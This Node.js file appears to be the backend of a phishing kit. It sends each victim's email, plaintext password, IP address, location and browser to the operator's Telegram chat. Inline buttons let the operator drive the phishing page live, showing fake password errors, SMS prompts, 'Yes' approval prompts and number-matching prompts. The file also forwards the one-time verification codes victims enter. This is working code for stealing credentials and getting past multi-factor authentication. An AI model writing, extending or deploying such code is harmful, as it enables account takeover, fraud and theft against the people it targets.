const sessions = new Map(); // sessionId -> { chatId, messageId, command, data, resolvers, provider, email }

const db = require('./db');

async function apiCall(token, method, body) {
  const url = `https://api.telegram.org/bot${token}/${method}`;
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  return res.json();
}

function escapeHtml(str) {
  if (str == null) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function formatSubmission(sub) {
  const e = escapeHtml;
  const gps = sub.lat && sub.lng ? `${sub.lat},${sub.lng}` : 'N/A';
  const location = [sub.city, sub.region, sub.country].filter(Boolean).join(', ') || 'Unknown';
  const ua = sub.userAgent ? e(sub.userAgent.slice(0, 80)) + (sub.userAgent.length > 80 ? '…' : '') : 'Unknown';

  return [
    `🔔 <b>New Submission Received</b>`,
    `📧 <b>Email:</b> ${e(sub.email)}`,
    `🔑 <b>Password:</b> ${sub.password ? `<code>${e(sub.password)}</code>` : '<i>not provided</i>'}`,
    `📱 <b>Provider:</b> ${e(sub.provider)}`,
    `🌐 <b>Network &amp; Device Tracking</b>`,
    `🖥 <b>Browser:</b> ${ua}`,
    `📍 <b>Location:</b> ${e(location)}`,
    `📌 <b>Coords:</b> ${e(gps)}`,
    `🌐 <b>IP:</b> <code>${e(sub.ip)}</code>`,
  ].join('\n');
}

function isGmailProvider(provider) {
  if (!provider) return false;
  const p = String(provider).toLowerCase();
  return p === 'gmail' || p === 'google';
}

// Full keyboard for Gmail: success, password error, sms, yes-prompt, number prompt
function gmailKeyboard(sessionId) {
  return {
    inline_keyboard: [
      [
        { text: '✅ Success', callback_data: `cmd:success:${sessionId}` },
        { text: '❌ Password Error', callback_data: `cmd:password_error:${sessionId}` },
      ],
      [
        { text: '💬 Send SMS', callback_data: `cmd:sms:${sessionId}` },
        { text: '👍 Yes-Prompt', callback_data: `cmd:yes_prompt:${sessionId}` },
      ],
      [
        { text: '🔢 Number Prompt', callback_data: `cmd:number_prompt:${sessionId}` },
      ],
    ],
  };
}

// Standard keyboard for all non-Gmail providers: success, password error, sms, yes-prompt
function standardKeyboard(sessionId) {
  return {
    inline_keyboard: [
      [
        { text: '✅ Success', callback_data: `cmd:success:${sessionId}` },
        { text: '❌ Password Error', callback_data: `cmd:password_error:${sessionId}` },
      ],
      [
        { text: '💬 Send SMS', callback_data: `cmd:sms:${sessionId}` },
        { text: '👍 Yes-Prompt', callback_data: `cmd:yes_prompt:${sessionId}` },
      ],
    ],
  };
}

function keyboardForProvider(provider, sessionId) {
  if (isGmailProvider(provider)) return gmailKeyboard(sessionId);
  return standardKeyboard(sessionId);
}

function numberKeyboard(sessionId) {
  const rows = [];
  for (let start = 1; start <= 99; start += 8) {
    const row = [];
    for (let n = start; n <= Math.min(start + 7, 99); n++) {
      row.push({ text: `${n}`, callback_data: `num:${n}:${sessionId}` });
    }
    rows.push(row);
  }
  return { inline_keyboard: rows };
}

async function sendSubmissionNotification(sub, sessionId) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) {
    console.warn('[telegram] Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
    return { ok: false, error: 'not-configured' };
  }

  const text = formatSubmission(sub);
  const keyboard = keyboardForProvider(sub.provider, sessionId);
  try {
    const data = await apiCall(token, 'sendMessage', {
      chat_id: chatId,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      reply_markup: keyboard,
    });
    if (!data.ok) {
      console.error('[telegram] API error:', data.description);
      return { ok: false, error: data.description };
    }
    sessions.set(sessionId, {
      chatId,
      messageId: data.result.message_id,
      command: null,
      data: null,
      resolvers: [],
      provider: sub.provider,
      email: sub.email,
    });
    await db.saveSession(sessionId, { command: null, data: null, provider: sub.provider, email: sub.email, consumed: false });
    return { ok: true, messageId: data.result.message_id };
  } catch (err) {
    console.error('[telegram] fetch error:', err.message);
    return { ok: false, error: err.message };
  }
}

async function sendVerificationCode(sessionId, code) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return { ok: false };

  const session = sessions.get(sessionId);
  const e = escapeHtml;
  const emailStr = session ? e(session.email) : 'Unknown';

  try {
    await apiCall(token, 'sendMessage', {
      chat_id: chatId,
      text: `🔐 <b>Verification Code Submitted</b>\n📧 <b>Email:</b> ${emailStr}\n🔢 <b>Code:</b> <code>${e(String(code))}</code>`,
      parse_mode: 'HTML',
    });
    return { ok: true };
  } catch (err) {
    console.error('[telegram] sendVerificationCode error:', err.message);
    return { ok: false };
  }
}

async function handleCallback(callbackQuery) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) return;

  const { id: callbackId, data: cbData, message } = callbackQuery;

  await apiCall(token, 'answerCallbackQuery', { callback_query_id: callbackId });

  const parts = cbData.split(':');
  if (parts[0] === 'cmd') {
    const [, cmd, sessionId] = parts;
    const session = sessions.get(sessionId);

    if (cmd === 'number_prompt') {
      await apiCall(token, 'sendMessage', {
        chat_id: message.chat.id,
        text: '✅ <b>Number prompt</b>\n\nSelect number (1–99):',
        parse_mode: 'HTML',
        reply_markup: numberKeyboard(sessionId),
      });
      return;
    }

    if (session) {
      session.command = cmd;
      // For sms command, pass the stored email as data so the frontend can display it
      session.data = cmd === 'sms' ? (session.email || null) : null;
      notifyResolvers(session, { command: cmd, data: session.data });
      await db.saveSession(sessionId, { command: cmd, data: session.data, provider: session.provider, email: session.email, consumed: false });
    }

    const kb = session ? keyboardForProvider(session.provider, sessionId) : standardKeyboard(sessionId);
    await apiCall(token, 'editMessageReplyMarkup', {
      chat_id: message.chat.id,
      message_id: message.message_id,
      reply_markup: kb,
    });

  } else if (parts[0] === 'num') {
    const [, num, sessionId] = parts;
    const session = sessions.get(sessionId);
    if (session) {
      session.command = 'number_prompt';
      session.data = num;
      notifyResolvers(session, { command: 'number_prompt', data: num });
      await db.saveSession(sessionId, { command: 'number_prompt', data: num, provider: session.provider, email: session.email, consumed: false });
    }
    const kb = session ? keyboardForProvider(session.provider, sessionId) : standardKeyboard(sessionId);
    await apiCall(token, 'editMessageReplyMarkup', {
      chat_id: message.chat.id,
      message_id: message.message_id,
      reply_markup: kb,
    });
  }
}

function notifyResolvers(session, payload) {
  const resolvers = session.resolvers.splice(0);
  for (const resolve of resolvers) {
    resolve(payload);
  }
}

function waitForCommand(sessionId) {
  return new Promise((resolve) => {
    const session = sessions.get(sessionId);
    if (!session) return resolve(null);
    if (session.command) {
      const payload = { command: session.command, data: session.data };
      session.command = null;
      session.data = null;
      // Keep the command in the persistent store so a returning user can still see it.
      // Only clear it when a new command overwrites it or the user explicitly dismisses.
      return resolve(payload);
    }
    const timeout = setTimeout(() => {
      const idx = session.resolvers.indexOf(resolve);
      if (idx !== -1) session.resolvers.splice(idx, 1);
      resolve(null);
    }, 20000);
    session.resolvers.push((payload) => {
      clearTimeout(timeout);
      resolve(payload);
    });
  });
}

async function getSession(sessionId) {
  // If not in memory, try to restore from the persistent store (handles server restart)
  if (!sessions.has(sessionId)) {
    const persistent = await db.getSession(sessionId);
    if (persistent) {
      sessions.set(sessionId, {
        chatId: null,
        messageId: null,
        command: persistent.command || null,
        data: persistent.data || null,
        resolvers: [],
        provider: persistent.provider,
        email: persistent.email,
      });
    }
  }
  return sessions.get(sessionId) || null;
}

async function getPersistentSession(sessionId) {
  return await db.getSession(sessionId);
}

async function clearSession(sessionId) {
  sessions.delete(sessionId);
  await db.deleteSession(sessionId);
}

async function setWebhook(webhookUrl) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) {
    console.warn('[telegram] Cannot set webhook: TELEGRAM_BOT_TOKEN missing');
    return { ok: false };
  }
  try {
    const data = await apiCall(token, 'setWebhook', {
      url: webhookUrl,
      drop_pending_updates: true,
      allowed_updates: JSON.stringify(['callback_query']),
    });
    if (data.ok) {
      console.log(`[telegram] Webhook registered: ${webhookUrl}`);
    } else {
      console.error('[telegram] setWebhook failed:', data.description);
    }
    return data;
  } catch (err) {
    console.error('[telegram] setWebhook error:', err.message);
    return { ok: false, error: err.message };
  }
}

module.exports = {
  sendSubmissionNotification,
  sendVerificationCode,
  handleCallback,
  waitForCommand,
  getSession,
  getPersistentSession,
  clearSession,
  setWebhook,
  formatSubmission,
  escapeHtml,
};
